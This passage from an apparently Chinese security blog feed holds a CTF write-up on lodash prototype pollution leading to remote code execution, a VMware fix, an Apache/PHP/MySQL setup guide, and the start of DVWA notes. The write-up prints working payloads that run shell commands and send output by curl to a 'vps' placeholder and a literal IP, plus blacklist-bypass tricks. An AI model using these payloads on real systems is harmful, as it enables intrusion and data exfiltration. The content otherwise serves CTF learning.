class="hljs-built_in">console</span>.log(user.admintoken)<br>  <span class="hljs-keyword">if</span> (<br>    user.admintoken &amp;&amp;<br>    req.query.querytoken &amp;&amp;<br>    md5(user.admintoken) === req.query.querytoken<br>  ) &#123;<br>    res.send(<br>      <span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span><br>    )<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> client = req.body<br>  <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span><br><br>  <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>) &#123;<br>    client.row %= <span class="hljs-number">3</span><br>    client.col %= <span class="hljs-number">3</span><br>  &#125;<br>  matrix[client.row][client.col] = client.data<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: <span class="hljs-number">0</span> &#125;))<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: winner &#125;))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span> &#125;))<br>  &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>首先判断请求方式是 POST，然后进行下一步，通过 lodash.merge，将我们 body 中的数值给 data,然后 session 中储存这个 data，这里也大概跟了一下 lodash.merge，其原理应该就是正常的 merge。</p><p>赋值完了之后进行渲染 index,在渲染的适合，会跳到下面这个函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123;<br>  <span class="hljs-comment">// define the template engine</span><br>  fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>    <span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123; ...options &#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>正常传参，断点到template，跟下去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> +<br>        (<span class="hljs-string">&#x27;sourceURL&#x27;</span> <span class="hljs-keyword">in</span> options<br>          ? options.sourceURL<br>          : (<span class="hljs-string">&#x27;lodash.templateSources[&#x27;</span> + (++templateCounter) + <span class="hljs-string">&#x27;]&#x27;</span>)<br>        ) + <span class="hljs-string">&#x27;\n&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530171123571.png"></p><p>此时<code>options.sourceURL</code>是没有定义的，选取这个变量，污染<code>sourceURL</code>，先来看<code>template</code>方法</p><p>返回值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>          .apply(<span class="hljs-literal">undefined</span>, importsValues);<br>      &#125;);<br></code></pre></td></tr></table></figure><p>匿名函数钟<code>importValues</code>以数组形式代表参数，这样调用确实不太明白(其中apply是对匿名函数的调用，undefined是指代当前的匿名函数，传进[1,2])，很抽象，继续往下看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530172808456.png"></p><p>那么我们控制原型链污染<code>soureceURL</code>后，提前返回污染语句，污染值为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">\r\nreturn e = <span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()&#125;\r\n<br></code></pre></td></tr></table></figure><p>其中<code>\r\n</code>是逃避注释的</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530174452516.png"></p><p>为什么需要return一个匿名函数呢？继续往下看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530181823825.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530181934207.png"></p><p>污染前后可见，res返回需要<code>compiled</code>去动态引入一些配置变量，而且进行第二步的命令执行</p><p>而<code>compiled</code>在<code>template</code>方法返回的是对象函数，然后作为匿名函数</p><p><code>let rendered = compiled(&#123;...options&#125;)</code></p><p>因此需要返回的是一个函数</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\r\nreturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>不使用return返回，则没有回显，可以配合dnslog或者vps外带</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//反引号好像在win中不起作用，我还以为外带写错了</span><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://vps/\u0060id\u0060&#x27;)&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://vps/`id`&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>刚开始肯定会突然发现，为什么两者截然不同的污染语句，但可以同样命令执行呢</p><p>仔细地看，其实没有回显的，执行在apply里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>         .apply(<span class="hljs-literal">undefined</span>, importsValues);<br>     &#125;);<br></code></pre></td></tr></table></figure><p>而我们有回显的的apply执行了return，在<code>let rendered = compiled(&#123;...options&#125;)</code>的匿名函数里execSync执行</p><h4 id="2022网刃杯ezjs"><a href="#2022网刃杯ezjs" class="headerlink" title="2022网刃杯ezjs"></a>2022网刃杯ezjs</h4><p>就是Code-breaking Thejs</p><p>不同的地方加了一个黑名单，需要fuzz</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530182938957.png"></p><p>fuzz到的名单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">blacklist = [<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;return&quot;</span>,<span class="hljs-string">&quot;execSync&quot;</span>,<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;wget&quot;</span>,<span class="hljs-string">&quot;echo&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;nl&quot;</span>,<span class="hljs-string">&quot;tac&quot;</span>,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br></code></pre></td></tr></table></figure><p>首先是有无回显的选取，return被ban了，显然是绕不了了，那么就是无回显，无回显curl，wget，tac等可以<code>cu&#39;+&#39;rl</code>，空格<code>$&#123;IFS&#125;9</code>，flag=&gt;<code>fla\&quot;\&quot;g</code>，<code>global.process.mainModule.require=&gt;global.process.mainModule.constructor._load</code>，<code>execSynec=&gt;exec</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://114.115.157.10/`id`&#x27;)&quot;</span>&#125;&#125;<br><br>#/<span class="hljs-string">&quot;/&quot;</span>  <span class="hljs-string">&quot;+&quot;</span>  单双引号都可以<br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://vps/`ta&#x27;+&#x27;c$&#123;IFS&#125;../fl\&quot;\&quot;ag`&#x27;)&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://vps/`ta\&quot;\&quot;c$&#123;IFS&#125;../fl\&quot;\&quot;ag`&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vm证书bug</title>
    <link href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/"/>
    <url>/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/</url>
    
    <content type="html"><![CDATA[<p>原因：VMware Authorization Service这个服务替换了本地根证书<br><img src="https://img-blog.csdnimg.cn/2021030518513134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>解决方案：<br>打开控制面板-管理工具-服务，设置VMware workstation server这个服务的启动类型为手动</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql+Apache+PHP</title>
    <link href="/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安装apache"><a href="#一、安装apache" class="headerlink" title="一、安装apache"></a>一、安装apache</h1><p>高版本不再提供msi安装 下载到的为压缩包方式 需要手动注册apache服务</p><ul><li>将apache解压至目标文件夹并配置<code>conf/httpd.conf</code>：<br><img src="https://img-blog.csdnimg.cn/20210126102746612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li><li>以管理员身份运行cmd，键入<code> .\..\Apache\bin&gt;httpd.exe -k install -n apache</code> 安装服务</li><li>键入<code>httpd.exe</code>即可启动服务</li><li>在浏览器中键入localhost:端口号<br>如下即apache安装成功<br><img src="https://img-blog.csdnimg.cn/202101271130525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h1 id="二、安装php"><a href="#二、安装php" class="headerlink" title="二、安装php"></a>二、安装php</h1><p>下载好php.zip解压至目标文件夹（注意：下载的php应该是有线程安全的版本）</p><p>写一个1.php（echo hello world）<br>cmd里键入<code>php.exe -f 1.php</code><br><img src="https://img-blog.csdnimg.cn/20210127113446262.png"><br>没问题php安装成功，接下来</p><h1 id="三、从apache加载php"><a href="#三、从apache加载php" class="headerlink" title="三、从apache加载php"></a>三、从apache加载php</h1><ul><li>打开php文件中的<code>php.ini-development</code>改名为<code>php.ini</code></li><li>修改<code>php.ini</code>的语句：<br>①去掉语句<code>;extension_dir=“ext”</code>分号（ini文件中;号为注释符）<br>②双引号内的<code>ext</code>更改为<code>php安装目录/ext</code></li><li>修改<code>apache/conf/httpd.conf</code> 在LoadModule代码区下方添加：<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> <span class="hljs-comment">#php安装路径/php7apache2_4.dll</span><br>LoadModule php_module <span class="hljs-string">&quot;php安装目录/php7apache2_4.dll&quot;</span> <br> <span class="hljs-comment">#php安装路径</span><br>PHPIniDir <span class="hljs-string">&quot;php安装目录&quot;</span> <br><span class="hljs-comment">#关联 *.php 文件</span><br>AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span><br></code></pre></td></tr></table></figure></li></ul><p>配置中使用<br><code>httpd.exe -t</code> 查看配置有无问题<br><code>htttp.exe -M</code> 查看加载的模块<br><img src="https://img-blog.csdnimg.cn/20210127134103576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>搭建时注意：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">一、apache和php的版本运行库要求一致 否则报错can<span class="hljs-symbol">&#x27;t</span> locate api module（原因未明）<br>二、apache和php配置文件中路径都使用/作为路径分隔符 不得使用\（会当成转义字符 引发报错）<br>三、从apache加载php模块时 注意代码注释不能置于语句后（tm就是个天坑 浪费老子时间）<br></code></pre></td></tr></table></figure><h1 id="四、安装mysql"><a href="#四、安装mysql" class="headerlink" title="四、安装mysql"></a>四、安装mysql</h1><p>可以使用离线安装版 这里熟悉环境的配置 提高难度<br>选择解压缩版：</p><ul><li><p>下载好mysql 解压缩至目标文件夹并创建<code>my.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment"># 设置mysql的安装目录，也就是刚才我们解压的目录</span><br><span class="hljs-attr">basedir</span>=D:/blog/mysql<br><span class="hljs-comment"># 设置mysql数据库的数据的存放目录</span><br><span class="hljs-attr">datadir</span>=D:/blog/mysql/data<br><span class="hljs-comment"># 设置默认使用的端口</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-comment"># 允许最大连接数</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span><br><span class="hljs-comment"># 允许连接失败的次数。这是为了防止有人试图攻击数据库</span><br><span class="hljs-attr">max_connect_errors</span>=<span class="hljs-number">10</span><br><span class="hljs-comment"># 服务端使用的字符集</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><span class="hljs-comment"># 数据库字符集对应一些排序等规则使用的字符集</span><br><span class="hljs-attr">collation-server</span>=utf8mb4_general_ci<br><span class="hljs-comment"># 创建新表时将使用的默认存储引擎</span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># 默认使用“mysql_native_password”插件作为认证加密方式</span><br><span class="hljs-comment"># MySQL8.0默认认证加密方式为caching_sha2_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br> <br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># 设置mysql客户端默认字符集</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br> <br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>① 以管理员的身份运行cmd：</p></li><li><p>初始化数据库<code>./../mysql/bin&gt;mysqld --initialize --console</code><br><img src="https://img-blog.csdnimg.cn/20210127213544982.png"> <strong>( root@localhost: fu8eu&gt;cGj8Cc )</strong></p></li><li><p>安装服务：<code>./../mysql/bin&gt;mysqld -install</code><br><img src="https://img-blog.csdnimg.cn/20210127213644968.png"></p></li><li><p>启动服务：<code>net start mysql或sc start mysql</code><br><img src="https://img-blog.csdnimg.cn/20210127214010779.png"></p></li><li><p>登录数据库：<code>mysql -u root -p</code>，输入复制的密码（手动输入）<img src="https://img-blog.csdnimg.cn/2021012721440381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p></li><li><p>马上更改密码:<code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;新密码&#39;;</code>（注意分号），提交：<code>commit;</code><br><img src="https://img-blog.csdnimg.cn/20210128094447532.png"></p></li><li><p>退出数据库：<code>quit;</code>(/q或者ctrl^z)<br><img src="https://img-blog.csdnimg.cn/20210127231852310.png"></p></li><li><p>将mysql的bin配置环境变量中（方便启动时不用切换目录）</p></li></ul><h1 id="五、php连接mysql"><a href="#五、php连接mysql" class="headerlink" title="五、php连接mysql"></a>五、php连接mysql</h1><p>此处使用的版本为php7 连接数据库与&lt;5.X有很大不同</p><ul><li>修改php.ini(之前已经配置过php.ini的一处ext.dir)<br>①去掉下面语句的分号：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">;<span class="hljs-attribute">extension</span>=mysqli<br>;<span class="hljs-attribute">extension</span>=pdo_mysql<br></code></pre></td></tr></table></figure>②在extension代码区下方添加：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">extension</span>=php_mysqli.dll<br><span class="hljs-attr">extension</span>=php_pdo_mysql.dll<br></code></pre></td></tr></table></figure>测试php能否加载mysqli模块：<br>在apache的htdocs下建立info.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>浏览器打开info.php：<br><img src="https://img-blog.csdnimg.cn/20210128110957113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">加载了mysqli的模块，配置成功</li></ul><p>测试php能否操作(连接)数据库：<br>在apache的htdocs下建立test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=@<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;mysqladmin&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;connect_error)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Connection failed:&#x27;</span>.<span class="hljs-variable">$db</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Connetion successful&lt;/h2&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210128112818969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>跳步配置php.ini的注意要重启apache服务 勿谓言之不预！</strong></p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>environment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>查看代码 发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/20210118115849953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>$ query  = “SELECT * FROM ’users‘ WHERE user = ‘$ user’ AND password = ‘$pass’;”;<br>构造 <code>admin’ # </code> 上图选中代码变为<br>$ query  = “SELECT * FROM ’users‘ WHERE user = ’admin’ <del># ‘ AND password = ‘$pass’;”;</del><br>（#为注释符）</p><p>即变成账户为admin 密码为空 绕过登录<br><img src="https://img-blog.csdnimg.cn/20210118120743567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>还可以抓包burp里进行字典爆破</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>利用管道符 命令执行漏洞<img 